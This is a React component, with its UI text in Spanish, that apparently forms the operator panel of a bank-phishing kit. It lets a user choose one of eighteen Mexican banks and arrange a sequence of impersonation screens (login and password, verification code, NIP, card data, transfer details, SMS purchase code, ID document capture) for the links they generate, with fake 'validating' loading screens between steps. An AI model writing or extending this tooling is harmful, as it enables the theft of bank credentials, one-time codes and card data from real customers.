import { useState, useEffect } from 'react';
import { useQuery, useMutation } from '@tanstack/react-query';
import { queryClient } from '@/lib/queryClient';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useToast } from '@/hooks/use-toast';
import { Plus, Trash2, Save, MoveUp, MoveDown, Info } from 'lucide-react';
import { ScreenType } from '@shared/schema';

const BANKS = [
  { code: 'liverpool', name: 'Liverpool' },
  { code: 'citibanamex', name: 'Citibanamex' },
  { code: 'banbajio', name: 'BanBajío' },
  { code: 'bbva', name: 'BBVA' },
  { code: 'banorte', name: 'Banorte' },
  { code: 'bancoppel', name: 'BanCoppel' },
  { code: 'hsbc', name: 'HSBC' },
  { code: 'amex', name: 'American Express' },
  { code: 'santander', name: 'Santander' },
  { code: 'scotiabank', name: 'Scotiabank' },
  { code: 'invex', name: 'Invex' },
  { code: 'banregio', name: 'Banregio' },
  { code: 'spin', name: 'Spin' },
  { code: 'platacard', name: 'Plata Card' },
  { code: 'bancoazteca', name: 'Banco Azteca' },
  { code: 'bienestar', name: 'Banco del Bienestar' },
  { code: 'inbursa', name: 'Inbursa' },
  { code: 'afirme', name: 'Afirme' }
];

const SCREEN_TYPES = [
  { value: ScreenType.FOLIO, label: 'Folio - Ingreso de número de folio' },
  { value: ScreenType.VALIDANDO, label: 'Validando - Pantalla de carga' },
  { value: ScreenType.LOGIN, label: 'Login - Usuario y contraseña' },
  { value: ScreenType.CODIGO, label: 'Código - Código de verificación' },
  { value: ScreenType.NIP, label: 'NIP - Número de identificación personal' },
  { value: ScreenType.TARJETA, label: 'Tarjeta - Datos de tarjeta' },
  { value: ScreenType.TRANSFERIR, label: 'Transferir - Datos bancarios' },
  { value: ScreenType.SMS_COMPRA, label: 'SMS Compra - Código SMS de compra' },
  { value: ScreenType.PROTECCION_BANCARIA, label: 'Protección Bancaria - Captura de documento' },
  { value: ScreenType.PROTECCION_SALDO, label: 'Protección Saldo - Protección de saldo' },
  { value: ScreenType.VERIFICACION_ID, label: 'Verificación ID - Verificación de identidad' },
  { value: ScreenType.CANCELACION, label: 'Cancelación - Cancelación de operación' },
  { value: ScreenType.CANCELACION_RETIRO, label: 'Cancelación Retiro - Cancelar retiro' },
  { value: ScreenType.MENSAJE, label: 'Mensaje - Mensaje personalizado' }
];

interface FlowStep {
  screenType: string;
  durationMs?: number;
  waitForUserInput?: boolean;
  payload?: Record<string, any>;
}

export default function UserFlowManager() {
  const { toast } = useToast();
  const [selectedBank, setSelectedBank] = useState<string>('');
  const [flowSteps, setFlowSteps] = useState<FlowStep[]>([]);

  // Obtener flujo existente del usuario para el banco seleccionado
  const { data: flowData, isLoading } = useQuery<{ success: boolean; flow: { flowConfig: FlowStep[] } | null }>({
    queryKey: ['/api/user-flows', selectedBank],
    queryFn: async () => {
      const response = await fetch(`/api/user-flows/${selectedBank}`);
      if (!response.ok) throw new Error('Error al obtener flujo');
      return response.json();
    },
    enabled: !!selectedBank,
  });

  // Cargar flujo cuando se obtiene
  useEffect(() => {
    if (flowData?.flow?.flowConfig) {
      setFlowSteps(flowData.flow.flowConfig);
    } else if (selectedBank && !isLoading && flowData) {
      // Si no hay flujo, iniciar con uno básico
      setFlowSteps([
        { screenType: ScreenType.FOLIO, waitForUserInput: true }
      ]);
    }
  }, [flowData, isLoading, selectedBank]);

  // Mutación para guardar flujo
  const saveMutation = useMutation({
    mutationFn: async () => {
      if (!selectedBank) throw new Error('Seleccione un banco');
      if (flowSteps.length === 0) throw new Error('Agregue al menos un paso al flujo');

      const response = await fetch(`/api/user-flows/${selectedBank}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ flowConfig: flowSteps })
      });
      
      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message || 'Error al guardar el flujo');
      }
      
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/user-flows', selectedBank] });
      toast({
        title: 'Flujo guardado',
        description: 'Tu flujo personalizado se guardó correctamente y se aplicará a todos los links que generes para este banco',
      });
    },
    onError: (error: Error) => {
      toast({
        title: 'Error',
        description: error.message,
        variant: 'destructive'
      });
    }
  });

  const addStep = () => {
    setFlowSteps([...flowSteps, {
      screenType: ScreenType.VALIDANDO,
      durationMs: 3000,
      waitForUserInput: false
    }]);
  };

  const removeStep = (index: number) => {
    setFlowSteps(flowSteps.filter((_, i) => i !== index));
  };

  const moveStep = (index: number, direction: 'up' | 'down') => {
    const newSteps = [...flowSteps];
    const targetIndex = direction === 'up' ? index - 1 : index + 1;
    
    if (targetIndex < 0 || targetIndex >= newSteps.length) return;
    
    [newSteps[index], newSteps[targetIndex]] = [newSteps[targetIndex], newSteps[index]];
    setFlowSteps(newSteps);
  };

  const updateStep = (index: number, field: keyof FlowStep, value: any) => {
    const newSteps = [...flowSteps];
    newSteps[index] = { ...newSteps[index], [field]: value };
    setFlowSteps(newSteps);
  };

  const handleBankChange = (bankCode: string) => {
    setSelectedBank(bankCode);
    setFlowSteps([]); // Limpiar pasos al cambiar de banco
  };

  return (
    <div className="container mx-auto p-6 space-y-6" data-testid="user-flow-manager">
      <div>
        <h1 className="text-3xl font-bold mb-2" data-testid="title-user-flow">Mis Flujos Personalizados</h1>
        <p className="text-muted-foreground" data-testid="description-user-flow">
          Configura cómo se verán las pantallas cuando tus clientes accedan a los links que generes
        </p>
      </div>

      {/* Información de uso */}
      <Card className="bg-blue-50 dark:bg-blue-950 border-blue-200 dark:border-blue-800">
        <CardContent className="pt-6">
          <div className="flex gap-3">
            <Info className="w-5 h-5 text-blue-600 dark:text-blue-400 flex-shrink-0 mt-0.5" />
            <div className="text-sm text-blue-900 dark:text-blue-100">
              <p className="font-medium mb-1">¿Cómo funciona?</p>
              <ul className="list-disc list-inside space-y-1 text-blue-800 dark:text-blue-200">
                <li>Selecciona un banco y configura el flujo de pantallas que verán tus clientes</li>
                <li>Cuando generes un link para este banco, se aplicará automáticamente tu flujo personalizado</li>
                <li>Las pantallas avanzarán según el tiempo configurado o cuando el usuario ingrese datos</li>
              </ul>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Selector de Banco */}
      <Card>
        <CardHeader>
          <CardTitle>Seleccionar Banco</CardTitle>
          <CardDescription>Elige el banco para configurar tu flujo personalizado</CardDescription>
        </CardHeader>
        <CardContent>
          <Select value={selectedBank} onValueChange={handleBankChange}>
            <SelectTrigger data-testid="select-bank">
              <SelectValue placeholder="Seleccione un banco..." />
            </SelectTrigger>
            <SelectContent>
              {BANKS.map(bank => (
                <SelectItem key={bank.code} value={bank.code} data-testid={`option-bank-${bank.code}`}>
                  {bank.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </CardContent>
      </Card>

      {/* Configurador de Flujo */}
      {selectedBank && (
        <>
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle>Flujo de Pantallas - {BANKS.find(b => b.code === selectedBank)?.name}</CardTitle>
                  <CardDescription>
                    Define el orden y configuración de las pantallas que verán tus clientes
                  </CardDescription>
                </div>
                <Button onClick={addStep} data-testid="button-add-step">
                  <Plus className="w-4 h-4 mr-2" />
                  Agregar Paso
                </Button>
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              {flowSteps.length === 0 ? (
                <div className="text-center py-8 text-muted-foreground" data-testid="text-no-steps">
                  No hay pasos configurados. Haz clic en "Agregar Paso" para comenzar.
                </div>
              ) : (
                flowSteps.map((step, index) => (
                  <Card key={index} className="border-2" data-testid={`card-step-${index}`}>
                    <CardContent className="pt-6">
                      <div className="grid grid-cols-1 md:grid-cols-12 gap-4 items-start">
                        {/* Número de paso */}
                        <div className="md:col-span-1 flex items-center justify-center">
                          <div className="w-8 h-8 rounded-full bg-primary text-primary-foreground flex items-center justify-center font-bold" data-testid={`text-step-number-${index}`}>
                            {index + 1}
                          </div>
                        </div>

                        {/* Tipo de pantalla */}
                        <div className="md:col-span-5 space-y-2">
                          <Label>Tipo de Pantalla</Label>
                          <Select
                            value={step.screenType}
                            onValueChange={(value) => updateStep(index, 'screenType', value)}
                          >
                            <SelectTrigger data-testid={`select-screen-type-${index}`}>
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              {SCREEN_TYPES.map(screen => (
                                <SelectItem key={screen.value} value={screen.value} data-testid={`option-screen-${screen.value}-${index}`}>
                                  {screen.label}
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>

                        {/* Configuración */}
                        <div className="md:col-span-4 space-y-2">
                          <Label>Configuración</Label>
                          <div className="flex gap-2">
                            <div className="flex-1">
                              <Input
                                type="number"
                                placeholder="Duración (ms)"
                                value={step.durationMs || ''}
                                onChange={(e) => updateStep(index, 'durationMs', parseInt(e.target.value) || undefined)}
                                disabled={step.waitForUserInput}
                                data-testid={`input-duration-${index}`}
                              />
                            </div>
                            <div className="flex items-center gap-2">
                              <input
                                type="checkbox"
                                id={`wait-${index}`}
                                checked={step.waitForUserInput || false}
                                onChange={(e) => {
                                  const newSteps = [...flowSteps];
                                  newSteps[index] = {
                                    ...newSteps[index],
                                    waitForUserInput: e.target.checked,
                                    durationMs: e.target.checked ? undefined : newSteps[index].durationMs
                                  };
                                  setFlowSteps(newSteps);
                                }}
                                data-testid={`checkbox-wait-input-${index}`}
                              />
                              <Label htmlFor={`wait-${index}`} className="text-xs whitespace-nowrap">
                                Esperar usuario
                              </Label>
                            </div>
                          </div>
                        </div>

                        {/* Acciones */}
                        <div className="md:col-span-2 flex gap-1 justify-end">
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={() => moveStep(index, 'up')}
                            disabled={index === 0}
                            data-testid={`button-move-up-${index}`}
                          >
                            <MoveUp className="w-4 h-4" />
                          </Button>
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={() => moveStep(index, 'down')}
                            disabled={index === flowSteps.length - 1}
                            data-testid={`button-move-down-${index}`}
                          >
                            <MoveDown className="w-4 h-4" />
                          </Button>
                          <Button
                            variant="ghost"
                            size="icon"
                            onClick={() => removeStep(index)}
                            data-testid={`button-remove-step-${index}`}
                          >
                            <Trash2 className="w-4 h-4 text-destructive" />
                          </Button>
                        </div>
                      </div>

                      {/* Descripción del paso */}
                      <div className="mt-2 text-xs text-muted-foreground" data-testid={`text-step-description-${index}`}>
                        {step.waitForUserInput 
                          ? '⏸️ El flujo esperará hasta que el usuario complete esta pantalla'
                          : step.durationMs
                          ? `⏱️ Mostrará esta pantalla durante ${step.durationMs / 1000} segundos`
                          : '⚡ Pasará inmediatamente a la siguiente pantalla'
                        }
                      </div>
                    </CardContent>
                  </Card>
                ))
              )}
            </CardContent>
          </Card>

          {/* Botón Guardar */}
          {flowSteps.length > 0 && (
            <div className="flex justify-end">
              <Button
                onClick={() => saveMutation.mutate()}
                disabled={saveMutation.isPending}
                size="lg"
                data-testid="button-save-flow"
              >
                <Save className="w-4 h-4 mr-2" />
                {saveMutation.isPending ? 'Guardando...' : 'Guardar Flujo'}
              </Button>
            </div>
          )}
        </>
      )}
    </div>
  );
}
